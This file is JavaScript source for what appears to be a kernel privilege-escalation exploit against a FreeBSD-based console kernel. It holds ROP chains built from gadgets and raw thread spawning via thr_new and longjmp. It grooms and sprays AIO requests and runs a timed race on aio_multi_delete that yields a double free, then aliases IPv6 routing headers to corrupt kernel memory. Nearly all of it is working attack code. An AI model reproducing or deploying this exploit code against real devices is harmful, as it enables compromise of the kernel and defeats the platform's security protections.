function wait_for(addr, threshold) {
    while (read64_uncompressed(addr) !== threshold) {
        nanosleep(1);
    }
}

function pin_to_core(core) {
    const mask = malloc(0x10);
    write32_uncompressed(mask, BigInt(1 << core));
    syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, -1n, 0x10n, mask);
}

function get_core_index(mask_addr) {
    let num = Number(read32_uncompressed(mask_addr));
    let position = 0;
    while (num > 0) {
        num = num >>> 1;
        position++;
    }
    return position - 1;
}

function get_current_core() {
    const mask = malloc(0x10);
    syscall(SYSCALL.cpuset_getaffinity, 3n, 1n, -1n, 0x10n, mask);
    return get_core_index(mask);
}

function set_rtprio(prio) {
    const rtprio = malloc(0x4);
    write16_uncompressed(rtprio, PRI_REALTIME);
    write16_uncompressed(rtprio + 2n, BigInt(prio));
    syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);
}

function get_rtprio() {
    const rtprio = malloc(0x4);
    write16_uncompressed(rtprio, PRI_REALTIME);
    write16_uncompressed(rtprio + 2n, 0n);
    syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);
    return read16_uncompressed(rtprio + 0x2n);
}

function new_socket() {
    const sd = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    if (sd === 0xffffffffffffffffn) {
        throw new Error("new_socket error: " + hex(sd));
    }
    return sd
}

function new_tcp_socket() {
    const sd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
    if (sd === 0xffffffffffffffffn) {
        throw new Error("new_tcp_socket error: " + hex(sd));
    }            
    return sd
}

function set_sockopt(sd, level, optname, optval, optlen) {
    const result = syscall(SYSCALL.setsockopt, BigInt(sd), level, optname, optval, BigInt(optlen));
    if (result === 0xffffffffffffffffn) {
        throw new Error("set_sockopt error: " + hex(result));
    }
    return result;
}

function get_sockopt(sd, level, optname, optval, optlen) {
    const len_ptr = malloc(4);
    write32_uncompressed(len_ptr, BigInt(optlen));
    const result = syscall(SYSCALL.getsockopt, BigInt(sd), level, optname, optval, len_ptr);
    if (result === 0xffffffffffffffffn) {
        throw new Error("get_sockopt error: " + hex(result));
    }
    return read32_uncompressed(len_ptr);
}

function set_rthdr(sd, buf, len) {
    return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function get_rthdr(sd, buf, max_len) {
    return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
}

function free_rthdrs(sds) {
    for (let i = 0; i < sds.length; i++) {
        if (sds[i] !== 0xffffffffffffffffn) {
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_RTHDR, 0n, 0);
        }
    }
}

function build_rthdr(buf, size) {
    const len = ((Number(size) >> 3) - 1) & ~1;
    const actual_size = (len + 1) << 3;
        write8_uncompressed(buf, 0n);
        write8_uncompressed(buf + 1n, BigInt(len));
        write8_uncompressed(buf + 2n, 0n);
        write8_uncompressed(buf + 3n, BigInt(len >> 1));
    return actual_size;
}

function aton(ip_str) {
    const parts = ip_str.split('.').map(Number);
    return (parts[3] << 24) | (parts[2] << 16) | (parts[1] << 8) | parts[0];
}

function aio_submit_cmd(cmd, reqs, num_reqs, priority, ids) {
    const result = syscall(SYSCALL.aio_submit_cmd, cmd, reqs, BigInt(num_reqs), priority, ids);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_submit_cmd error: " + hex(result));
    }
    return result;
}

function aio_multi_delete(ids, num_ids, states) {
    const result = syscall(SYSCALL.aio_multi_delete, ids, BigInt(num_ids), states);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_delete error: " + hex(result));
    }
    return result;
}

function aio_multi_poll(ids, num_ids, states) {
    const result = syscall(SYSCALL.aio_multi_poll, ids, BigInt(num_ids), states);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_poll error: " + hex(result));
    }
    return result;
}

function aio_multi_cancel(ids, num_ids, states) {
    const result = syscall(SYSCALL.aio_multi_cancel, ids, BigInt(num_ids), states);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_cancel error: " + hex(result));
    }
    return result;
}

function aio_multi_wait(ids, num_ids, states, mode, timeout) {
    const result = syscall(SYSCALL.aio_multi_wait, ids, BigInt(num_ids), states, BigInt(mode), timeout);
    if (result === 0xffffffffffffffffn) {
        throw new Error("aio_multi_wait error: " + hex(result));
    }
    return result;
}

function make_reqs1(num_reqs) {
    const reqs = malloc(0x28 * num_reqs);
    for (let i = 0; i < num_reqs; i++) {
        write32_uncompressed(reqs + BigInt(i * 0x28 + 0x20), -1n);
    }
    return reqs;
}

function spray_aio(loops, reqs, num_reqs, ids, multi, cmd) {
    loops = loops || 1;
    cmd = cmd || AIO_CMD_READ;
    if (multi === undefined) multi = true;

    const step = 4 * (multi ? num_reqs : 1);
    const final_cmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0n);

    for (let i = 0; i < loops; i++) {
        aio_submit_cmd(final_cmd, reqs, num_reqs, 3n, ids + BigInt(i * step));
    }
}

function cancel_aios(ids, num_ids) {
    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    const errors = malloc(4 * len);

    for (let i = 0; i < num_batches; i++) {
        aio_multi_cancel(ids + BigInt(i * 4 * len), len, errors);
    }

    if (rem > 0) {
        aio_multi_cancel(ids + BigInt(num_batches * 4 * len), rem, errors);
    }
}

function free_aios(ids, num_ids, do_cancel) {
    if (do_cancel === undefined) do_cancel = true;

    const len = MAX_AIO_IDS;
    const rem = num_ids % len;
    const num_batches = Math.floor((num_ids - rem) / len);

    const errors = malloc(4 * len);

    for (let i = 0; i < num_batches; i++) {
        const addr = ids + BigInt(i * 4 * len);
        if (do_cancel) {
            aio_multi_cancel(addr, len, errors);
        }
        aio_multi_poll(addr, len, errors);
        aio_multi_delete(addr, len, errors);
    }

    if (rem > 0) {
        const addr = ids + BigInt(num_batches * 4 * len);
        if (do_cancel) {
            aio_multi_cancel(addr, rem, errors);
        }
        aio_multi_poll(addr, rem, errors);
        aio_multi_delete(addr, rem, errors);
    }
}

function free_aios2(ids, num_ids) {
    free_aios(ids, num_ids, false);
}

function call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid) {
    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n;

    let rop_i = 0;
    
    // write(pipe_write_fd, pipe_buf, 1)
    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.write;
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = pipe_write_fd;
    fake_rop[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
    fake_rop[rop_i++] = pipe_buf;
    fake_rop[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
    fake_rop[rop_i++] = 1n;
    fake_rop[rop_i++] = syscall_wrapper;
    
    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.sched_yield;
    fake_rop[rop_i++] = syscall_wrapper;
    
    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.thr_suspend_ucontext;
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = thr_tid;
    fake_rop[rop_i++] = syscall_wrapper;
    
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = base_heap_add + fake_rop_return;
    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret
    
    // Return safe tagged value to JavaScript
    fake_rop[rop_i++] = g.get('pop_rax'); // mov rax, 0x200000000 ; ret
    fake_rop[rop_i++] = 0x2000n;                 // Fake value in RAX to make JS happy
    fake_rop[rop_i++] = g.get('pop_rsp_pop_rbp');
    fake_rop[rop_i++] = real_rbp;
    
    write64(add_rop_smash_code_store, 0xab00260325n);
    oob_arr[39] = base_heap_add + fake_frame;
    rop_smash(obj_arr[0]);          // Call ROP
}

function call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid) {
    call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid);
    return read64(fake_rop_return);
}

function init_threading() {
   
    const jmpbuf = malloc(0x60);
    
    call(setjmp_addr, jmpbuf);
    saved_fpu_ctrl = Number(read32_uncompressed(jmpbuf + 0x40n));
    saved_mxcsr = Number(read32_uncompressed(jmpbuf + 0x44n));
}

function spawn_thread(fake_rop_race1_array) {
    const fake_rop_race1_addr = get_backing_store(fake_rop_race1_array);
    
    const jmpbuf = malloc(0x60);
    
    write64_uncompressed(jmpbuf + 0x00n, g.get('ret'));      // ret addr (RIP)
    write64_uncompressed(jmpbuf + 0x10n, fake_rop_race1_addr);             // RSP - pivot to fake_rop_race1
    write32_uncompressed(jmpbuf + 0x40n, BigInt(saved_fpu_ctrl));   // FPU control word
    write32_uncompressed(jmpbuf + 0x44n, BigInt(saved_mxcsr));      // MXCSR
    
    const stack_size = 0x400n;
    const tls_size = 0x40n;
    
    const thr_new_args = malloc(0x80);
    const tid_addr = malloc(0x8);
    const cpid = malloc(0x8);
    const stack = malloc(Number(stack_size));
    const tls = malloc(Number(tls_size));
    
    write64_uncompressed(thr_new_args + 0x00n, longjmp_addr);       // start_func = longjmp
    write64_uncompressed(thr_new_args + 0x08n, jmpbuf);             // arg = jmpbuf
    write64_uncompressed(thr_new_args + 0x10n, stack);              // stack_base
    write64_uncompressed(thr_new_args + 0x18n, stack_size);         // stack_size
    write64_uncompressed(thr_new_args + 0x20n, tls);                // tls_base
    write64_uncompressed(thr_new_args + 0x28n, tls_size);           // tls_size
    write64_uncompressed(thr_new_args + 0x30n, tid_addr);           // child_tid (output)
    write64_uncompressed(thr_new_args + 0x38n, cpid);               // parent_tid (output)
    
    const result = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
    
    if (result !== 0n) {
        throw new Error("thr_new failed: " + hex(result));
    }
    
    const tid = read64_uncompressed(tid_addr);
    return tid;
}

function setup() {
    try {

        init_threading();

        ready_signal = malloc(8);
        deletion_signal = malloc(8);
        pipe_buf = malloc(8);
        write64_uncompressed(ready_signal, 0n);
        write64_uncompressed(deletion_signal, 0n);

        prev_core = get_current_core();
        prev_rtprio = get_rtprio();
        
        pin_to_core(MAIN_CORE);
        set_rtprio(MAIN_RTPRIO);

        logger.log("Pinned to core " + get_current_core() + " with prio " + MAIN_RTPRIO);
        
        const sockpair = malloc(8);
        if (syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sockpair) !== 0n) {
            return false;
        }

        block_fd = read32_uncompressed(sockpair);
        unblock_fd = read32_uncompressed(sockpair + 4n);
        logger.log("Created socketpair: block_fd=" + block_fd + " unblock_fd=" + unblock_fd);

        const block_reqs = malloc(0x28 * NUM_WORKERS);
        for (let i = 0; i < NUM_WORKERS; i++) {
            const offset = i * 0x28;
            write32_uncompressed(block_reqs + BigInt(offset + 0x08), 1n);
            write32_uncompressed(block_reqs + BigInt(offset + 0x20), block_fd);
        }

        const block_id_buf = malloc(4);
        if (aio_submit_cmd(AIO_CMD_READ, block_reqs, NUM_WORKERS, 3n, block_id_buf) !== 0n) {
            return false;
        }

        block_id = read32_uncompressed(block_id_buf);
        logger.log("AIO workers blocked with ID: " + block_id);
        logger.flush();
        
        const num_reqs = 3;
        const groom_reqs = make_reqs1(num_reqs);
        const groom_ids_addr = malloc(4 * NUM_GROOMS);
        
        spray_aio(NUM_GROOMS, groom_reqs, num_reqs, groom_ids_addr, false);
        cancel_aios(groom_ids_addr, NUM_GROOMS);
        
        groom_ids = [];
        for (let i = 0; i < NUM_GROOMS; i++) {
            groom_ids.push(Number(read32_uncompressed(groom_ids_addr + BigInt(i * 4))));
        }
        
        sds = [];
        for (let i = 0; i < NUM_SDS; i++) {
            sds.push(new_socket());
        }
        
        sds_alt = [];
        for (let i = 0; i < NUM_SDS_ALT; i++) {
            sds_alt.push(new_socket());
        }
        
        return true;

    } catch (e) {
        logger.log("Setup failed: " + e.message);
        logger.flush();
        return false;
    }
}

function double_free_reqs2() {
    try {
        const server_addr = malloc(16);
        write8_uncompressed(server_addr + 1n, AF_INET);
        write16_uncompressed(server_addr + 2n, 0n);
        write32_uncompressed(server_addr + 4n, BigInt(aton("127.0.0.1")));

        const sd_listen = new_tcp_socket();

        const enable = malloc(4);
        write32_uncompressed(enable, 1n);
        set_sockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4);

        if (syscall(SYSCALL.bind, sd_listen, server_addr, 16n) !== 0n) {
            logger.log("bind failed");
            syscall(SYSCALL.close, sd_listen);
            return null;
        }

        const addr_len = malloc(4);
        write32_uncompressed(addr_len, 16n);
        if (syscall(SYSCALL.getsockname, sd_listen, server_addr, addr_len) !== 0n) {
            logger.log("getsockname failed");
            syscall(SYSCALL.close, sd_listen);
            return null;
        }
        logger.log("Bound to port: " + Number(read16_uncompressed(server_addr + 2n)));

        if (syscall(SYSCALL.listen, sd_listen, 1n) !== 0n) {
            logger.log("listen failed");
            syscall(SYSCALL.close, sd_listen);
            return null;
        }
        
        const num_reqs = 3;
        const which_req = num_reqs - 1;
        const reqs = make_reqs1(num_reqs);
        const aio_ids = malloc(4 * num_reqs);
        const req_addr = aio_ids + BigInt(which_req * 4);
        const errors = malloc(4 * num_reqs);
        const cmd = AIO_CMD_MULTI_READ;

        for (let attempt = 1; attempt <= NUM_RACES; attempt++) {
            logger.log("Race attempt " + attempt + "/" + NUM_RACES);

            const sd_client = new_tcp_socket();

            if (syscall(SYSCALL.connect, sd_client, server_addr, 16n) !== 0n) {
                syscall(SYSCALL.close, sd_client);
                continue;
            }

            const sd_conn = syscall(SYSCALL.accept, sd_listen, 0n, 0n);

            const linger_buf = malloc(8);
            write32_uncompressed(linger_buf, 1n);
            write32_uncompressed(linger_buf + 4n, 1n);
            set_sockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8);
            
            write32_uncompressed(reqs + BigInt(which_req * 0x28 + 0x20), sd_client);
            
            if (aio_submit_cmd(cmd, reqs, num_reqs, 3n, aio_ids) !== 0n) {
                syscall(SYSCALL.close, sd_client);
                syscall(SYSCALL.close, sd_conn);
                continue;
            }

            aio_multi_cancel(aio_ids, num_reqs, errors);
            aio_multi_poll(aio_ids, num_reqs, errors);
            
            syscall(SYSCALL.close, sd_client);
            
            const sd_pair = race_one(req_addr, sd_conn, sds);

            aio_multi_delete(aio_ids, num_reqs, errors);
            syscall(SYSCALL.close, sd_conn);

            if (sd_pair !== null) {
                logger.log("Won race at attempt " + attempt);
                syscall(SYSCALL.close, sd_listen);
                return sd_pair;
            }
        }

        syscall(SYSCALL.close, sd_listen);
        return null;

    } catch (e) {
        logger.log("Stage 1 error: " + e.message);
        logger.flush();
        return null;
    }
}

function make_aliased_rthdrs(sds) {
    const marker_offset = 4;
    const size = 0x80;
    const buf = malloc(size);
    const rsize = build_rthdr(buf, size);

    for (let loop = 1; loop <= NUM_ALIAS; loop++) {
        for (let i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
            const sd = Number(sds[i-1]);
            if (sds[i-1] !== 0xffffffffffffffffn) {
                write32_uncompressed(buf + BigInt(marker_offset), BigInt(i));
                set_rthdr(sd, buf, rsize);
            }
        }

        for (let i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
            const sd = Number(sds[i-1]);
            if (sds[i-1] !== 0xffffffffffffffffn) {
                get_rthdr(sd, buf, size);
                const marker = Number(read32_uncompressed(buf + BigInt(marker_offset)));
                
                if (marker !== i && marker > 0 && marker <= NUM_SDS) {
                    const aliased_idx = marker - 1;
                    const aliased_sd = Number(sds[aliased_idx]);
                    if (aliased_idx >= 0 && aliased_idx < sds.length && sds[aliased_idx] !== 0xffffffffffffffffn) {
                        logger.log("Aliased rthdrs at attempt: " + loop);

                        const sd_pair = [sd, aliased_sd];
                        const max_idx = Math.max(i-1, aliased_idx);
                        const min_idx = Math.min(i-1, aliased_idx);
                        sds.splice(max_idx, 1);
                        sds.splice(min_idx, 1);
                        free_rthdrs(sds);
                        sds.push(new_socket());
                        sds.push(new_socket());
                        return sd_pair;
                    }
                }
            }
        }
    }
    return null;
}

function race_one(req_addr, tcp_sd, sds) {
    try {
        write64_uncompressed(ready_signal, 0n);
        write64_uncompressed(deletion_signal, 0n);

        const sce_errs = malloc(8);
        write32_uncompressed(sce_errs, -1n);
        write32_uncompressed(sce_errs + 4n, -1n);

        const [pipe_read_fd, pipe_write_fd] = create_pipe();
        
        const fake_rop_race1 = new BigUint64Array(200);
        
        // fake_rop_race1[0] will be overwritten by longjmp, so skip it
        let rop_i = 1;

        const cpu_mask = malloc(0x10);
        write16_uncompressed(cpu_mask, BigInt(1 << MAIN_CORE));
        
        // Pin to core
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = SYSCALL.cpuset_setaffinity;
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = 3n;
        fake_rop_race1[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
        fake_rop_race1[rop_i++] = 1n;
        fake_rop_race1[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
        fake_rop_race1[rop_i++] = -1n;
        fake_rop_race1[rop_i++] = g.get('pop_rcx'); // pop rcx ; ret
        fake_rop_race1[rop_i++] = 0x10n;
        fake_rop_race1[rop_i++] = g.get('pop_r8'); // pop r8 ; ret
        fake_rop_race1[rop_i++] = cpu_mask;
        fake_rop_race1[rop_i++] = syscall_wrapper;

        const rtprio_buf = malloc(4);
        write16_uncompressed(rtprio_buf, PRI_REALTIME);
        write16_uncompressed(rtprio_buf + 2n, BigInt(MAIN_RTPRIO));

        // Set priority
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = SYSCALL.rtprio_thread;
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = 1n;
        fake_rop_race1[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
        fake_rop_race1[rop_i++] = 0n;
        fake_rop_race1[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
        fake_rop_race1[rop_i++] = rtprio_buf;
        fake_rop_race1[rop_i++] = syscall_wrapper;

        // Signal ready
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = ready_signal;
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = 1n;
        fake_rop_race1[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret
        
        // Read from pipe (blocks here)
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = SYSCALL.read;
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = pipe_read_fd;
        fake_rop_race1[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
        fake_rop_race1[rop_i++] = pipe_buf;
        fake_rop_race1[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
        fake_rop_race1[rop_i++] = 1n;
        fake_rop_race1[rop_i++] = syscall_wrapper;

        // aio multi delete
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = SYSCALL.aio_multi_delete;
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = req_addr;
        fake_rop_race1[rop_i++] = g.get('pop_rsi'); // pop rsi ; ret
        fake_rop_race1[rop_i++] = 1n;
        fake_rop_race1[rop_i++] = g.get('pop_rdx'); // pop rdx ; ret
        fake_rop_race1[rop_i++] = sce_errs + 4n;
        fake_rop_race1[rop_i++] = syscall_wrapper;

        // Signal deletion
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = deletion_signal;
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = 1n;
        fake_rop_race1[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret

        // Thread exit
        fake_rop_race1[rop_i++] = g.get('pop_rax'); // pop rax ; ret
        fake_rop_race1[rop_i++] = SYSCALL.thr_exit;
        fake_rop_race1[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
        fake_rop_race1[rop_i++] = 0n;
        fake_rop_race1[rop_i++] = syscall_wrapper;
        
        const thr_tid = spawn_thread(fake_rop_race1);
        
        wait_for(ready_signal, 1n);
        
        const suspend_res = call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid);
        
        logger.log("Suspend result: " + hex(suspend_res));
        
        const poll_err = malloc(4);
        aio_multi_poll(req_addr, 1, poll_err);
        const poll_res = read32_uncompressed(poll_err);
        logger.log("Poll after suspend: " + hex(poll_res));

        const info_buf = malloc(0x100);
        const info_size = get_sockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, 0x100);
        
        if (info_size !== size_tcp_info) {
            logger.log("info size isn't " + size_tcp_info + ": " + info_size);
        }
        
        const tcp_state = read8_uncompressed(info_buf);
        logger.log("tcp_state: " + hex(tcp_state));
        
        let won_race = false;

        if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
            aio_multi_delete(req_addr, 1, sce_errs);
            won_race = true;
            logger.log("Race won!");
        } else {
            logger.log("Race not won (poll_res=" + hex(poll_res) + " tcp_state=" + hex(tcp_state) + ")");
        }

        const resume_result = syscall(SYSCALL.thr_resume_ucontext, thr_tid);
        logger.log("Resume " + hex(thr_tid) + ": " + resume_result);
        logger.flush();
        
        wait_for(deletion_signal, 1n);

        if (won_race) {
            const err_main_thr = read32_uncompressed(sce_errs);
            const err_worker_thr = read32_uncompressed(sce_errs + 4n);
            logger.log("sce_errs: main=" + hex(err_main_thr) + " worker=" + hex(err_worker_thr));

            if (err_main_thr === err_worker_thr && err_main_thr === 0n) {
                logger.log("Double-free successful, making aliased rthdrs...");
                const sd_pair = make_aliased_rthdrs(sds);
                
                if (sd_pair !== null) {
                    syscall(SYSCALL.close, pipe_read_fd);
                    syscall(SYSCALL.close, pipe_write_fd);
                    return sd_pair;
                } else {
                    logger.log("Failed to make aliased rthdrs");
                }
            } else {
                logger.log("sce_errs mismatch - race failed");
            }
        }

        syscall(SYSCALL.close, pipe_read_fd);
        syscall(SYSCALL.close, pipe_write_fd);
        return null;

    } catch (e) {
        logger.log("Race error: " + e.message);
        logger.log(e.stack);
        logger.flush();
        return null;
    }
}